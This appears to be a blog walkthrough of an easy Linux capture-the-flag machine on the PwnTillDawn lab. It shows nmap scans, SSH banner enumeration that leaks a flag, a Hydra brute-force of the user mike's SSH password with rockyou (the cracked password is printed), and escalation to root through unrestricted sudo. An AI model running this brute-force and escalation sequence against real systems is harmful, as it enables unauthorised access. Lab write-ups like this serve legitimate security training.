---
title: Stuntman Mike - Easy Linux Boot2root on PwntillDawn
date: 2023-10-28 00:00:00 -500
categories: [PwntillDawn]
tags: [Linux, PWTD, Easy, Hacking]
image:
    path: https://i.ibb.co/G5GTsCf/stuntman.png
---
PwnTillDawn Online Battlefield is a penetration testing lab created by the wizlynx group. Here, participants can put their offensive security skills to the test within a safe and legal environment, all while having a blast! The goal is simple: breach as many machines as possible by exploiting a sequence of weaknesses and vulnerabilities, and gather flags to demonstrate your successful exploitation
If you're eager to enhance your hacking skills and learn alongside us, we invite you to join the ranks of aspiring hackers and cybersecurity enthusiasts.

- **The Best Academy to Learn Hacking is [Here](https://affiliate.hackthebox.com/nenandjabhata)**.
- **Beginner Friendly challenges on TryHackMe [Here](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)**.

## Enumeration(Recon)
for the enumeration time, we always start with a basic nmap scan.. Like this.
```terminal
└─# nmap -Pn -p- --open 10.150.150.166
Host is up (1.1s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8089/tcp open  unknown
```
As you can see here, our nmap scan found only 2 open port, and the port `8089` service seem's to be unknow. Let's launch another scan on that specific port.
```terminal
└─# nmap -sV -p8089 $ip 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-28 13:22 GMT
Stats: 0:01:14 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 50.00% done; ETC: 13:24 (0:00:03 remaining)
Stats: 0:01:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 50.00% done; ETC: 13:24 (0:00:05 remaining)
Nmap scan report for 10.150.150.166
Host is up (0.94s latency).

PORT     STATE SERVICE  VERSION
8089/tcp open  ssl/http Splunkd httpd
```
So, here we used nmap with the `-sV` that will Probe open ports to determine service/version info. and here we found an http Splunkd Version on that port. Let's visit it.

![The Splunkd Website](https://i.ibb.co/MPTksXf/splunk.png){:class="img-responsive"}
In this website, i tried to launch a Directory Fuzzing attack but nothing on it. The second Way now is to attack the ssh port `22`.
I will try to connect on the root ssh account using the `-v` flag, to see All Verbosity.
```terminal
└─# ssh root@10.150.150.166 -v
debug1: get_agent_identities: bound agent to hostkey
debug1: get_agent_identities: ssh_fetch_identitylist: agent contains no identities
debug1: Will attempt key: /root/.ssh/id_rsa ED25519 SHA256:B0hYWC7V1dBf7UAC5CM40v15EhQp9lzkw6JU8akRQ/c
debug1: Will attempt key: /root/.ssh/id_ecdsa 
debug1: Will attempt key: /root/.ssh/id_ecdsa_sk 
debug1: Will attempt key: /root/.ssh/id_ed25519 
debug1: Will attempt key: /root/.ssh/id_ed25519_sk 
debug1: Will attempt key: /root/.ssh/id_xmss 
debug1: Will attempt key: /root/.ssh/id_dsa 
debug1: SSH2_MSG_EXT_INFO received
debug1: kex_input_ext_info: server-sig-algs=<ssh-ed25519,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521>
debug1: SSH2_MSG_SERVICE_ACCEPT received
You are attempting to login to stuntman mike's server - FLAG35=724a2734e80ddbd78b2694dc5eb74db395403360
debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: publickey
debug1: Offering public key: /root/.ssh/id_rsa ED25519 SHA256:B0hYWC7V1dBf7UAC5CM40v15EhQp9lzkw6JU8akRQ/c
debug1: Authentications that can continue: publickey,password
debug1: Trying private key: /root/.ssh/id_ecdsa
debug1: Trying private key: /root/.ssh/id_ecdsa_sk
debug1: Trying private key: /root/.ssh/id_ed25519
debug1: Trying private key: /root/.ssh/id_ed25519_sk
debug1: Trying private key: /root/.ssh/id_xmss
debug1: Trying private key: /root/.ssh/id_dsa
debug1: Next authentication method: password
root@10.150.150.166's password: 
```
As you can see in this ouput, we found this `You are attempting to login to stuntman mike's server - FLAG35=724a2734XXXXXXXXXXXXXXXXXXXXXXXXXXXXX`. 
On this note that tell Us we are trying to connect to mike's server, now we know that there is a mike user.
**Bruteforce mike's Password**
The method we are going to try, is to bruteforce this user(mike) password using `Hydra` and `rockyou`.
```terminal
└─# hydra -l mike -P /usr/share/wordlists/rockyou.txt ssh://10.150.150.166 -t 60 -I  
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-28 13:51:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 60 tasks per 1 server, overall 60 tasks, 14344399 login tries (l:1/p:14344399), ~239074 tries per task
[DATA] attacking ssh://10.150.150.166:22/
[22][ssh] host: 10.150.150.166   login: mike   password: babygirl
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 22 final worker threads did not complete until end.
[ERROR] 22 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
```
Wow, very fast. The password has been found, Now Let's connect on his ssh server using this password.
```terminal
└─# ssh mike@10.150.150.166
  System load:  0.01               Processes:            167
  Usage of /:   28.5% of 19.56GB   Users logged in:      1
  Memory usage: 20%                IP address for ens33: 10.150.150.166
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

18 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


*** System restart required ***
Last login: Tue Apr 21 08:57:00 2020
mike@stuntmanmike:~$ 
```
Successfuly logged in.
## Privilege Escalation
So here, we will check if the user mike have a `sudo` permission on this server using the `sudo -l`
```terminal
mike@stuntmanmike:~$ sudo -l
[sudo] password for mike: 
Sorry, try again.
[sudo] password for mike: 
Matching Defaults entries for mike on stuntmanmike:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on stuntmanmike:
    (ALL : ALL) ALL
```
Good, mike have ALL permission on this server. ALL we have to do is `sudo su` to get `root` privilegies.
```terminal
root@stuntmanmike:~# id;hostnamectl
uid=0(root) gid=0(root) groups=0(root)
   Static hostname: stuntmanmike
         Icon name: computer-vm
           Chassis: vm
        Machine ID: 98ba6d703d174d9e9879437ad460d5c4
           Boot ID: 7fc1f70009394ece804a03c26ed1d3ed
    Virtualization: vmware
  Operating System: Ubuntu 18.04.4 LTS
            Kernel: Linux 4.15.0-96-generic
      Architecture: x86-64
root@stuntmanmike:~# 
```

### Join Us
Thanks for reading. **Let's learn, explore, and hack together**. **Join us on Discord [here](https://discord.gg/wBT9wr9ruG)**. 